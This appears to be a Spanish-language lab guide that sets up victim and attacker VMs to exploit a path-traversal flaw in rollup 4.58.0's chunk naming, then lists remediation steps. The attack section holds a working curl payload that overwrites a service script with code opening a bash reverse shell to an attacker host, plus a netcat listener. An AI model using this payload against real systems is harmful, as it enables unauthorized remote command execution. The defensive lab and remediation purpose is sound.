# Setup

## Preparar vm víctima

### Obtener IP
```bash
hostname -I
```

### Dependencias
```bash
sudo apt update
sudo apt install -y nodejs npm netcat-openbsd nano
```

### script legítimo del servicio interno
```bash
sudo mkdir -p /opt/servicio
sudo bash -c 'echo "console.log(\"post-build ejecutado correctamente.\");" > /opt/servicio/post-build.js'
sudo chmod 666 /opt/servicio/post-build.js
```

### Preparar entorno con `rollup` con versión vulnerada
```bash
mkdir -p ~/rollup-lab/src
cd ~/rollup-lab
npm init -y
npm install rollup@4.58.0
echo 'console.log("Hola mundo - index.js");' > src/index.js
```

### Iniciar servicio
```bash
node server.js
```

## Preparar vm atacante
### Obtener IP
```bash
hostname -I
```

### Instalar herramientas
```bash
sudo apt update
sudo apt install -y curl netcat-openbsd
```

### Abrir listener para reverse shell
```bash
nc -lvnp 4444
# -l (listen): pone a netcat en modo de escucha
# -v (verbose): muestra información detallada en consola
# -n (numeric only): deshabilita la resolución de nombres por DNS
# -p 4444: indica puerto TCP local
```

## Ejecución del ataque
```bash
# en una terminal secundaria
curl -X POST http://<IP_VICTIMA>:3000/compile \
     -H "Content-Type: application/json" \
     -d '{
       "chunkName": "sub/../../../../../opt/servicio/post-build",
       "code": "const { exec } = require(\"child_process\"); exec(\"bash -c '\''bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'\''\");"
     }'
```

### Verificación
```bash
whoami
hostname -I
cat /opt/servicio/post-build.js
```

# Remediación
## 1. Detener servidor y restaurar script original
```bash
echo 'console.log("post-build ejecutado correctamente.");' > /opt/servicio/post-build.js
```

## 2. Actualizar rollup a versión sin la vulnerabilidad
```bash
npm install rollup@4.59.0
```

## 3. Actualizar permisos de `post-build.js`
Hacemos que el root sea el único que tenga permisos de escritura sobre el archivo `post-build.js`, los demás usuarios solo pueden leerlo y ejecutarlo

```bash
sudo chown root:root /opt/servicio/post-build.js
sudo chmod 644 /opt/servicio/post-build.js
ls -l /opt/servicio/post-build.js
```

## 4. Hacemos que el servidor corra sobre el usuario sin privilegios innecesarios

```bash
# add usuario sin acceso a la terminal
sudo useradd -r -s /usr/sbin/nologin rollupuser
sudo cp -r ~/rollup-lab /srv/rollup-lab
sudo chown -R rollupuser:rollupuser /srv/rollup-lab
```

## 5. Agregamos validación de entrada en `server.js`
> [!note]
>  correr `node server_corregido.js` en lugar de `server.js`

## 6. Levantamos servidor con usuario restringido y verificar bloqueo
```bash
cd /srv/rollup-lab 
sudo -u rollupuser node server.js
```
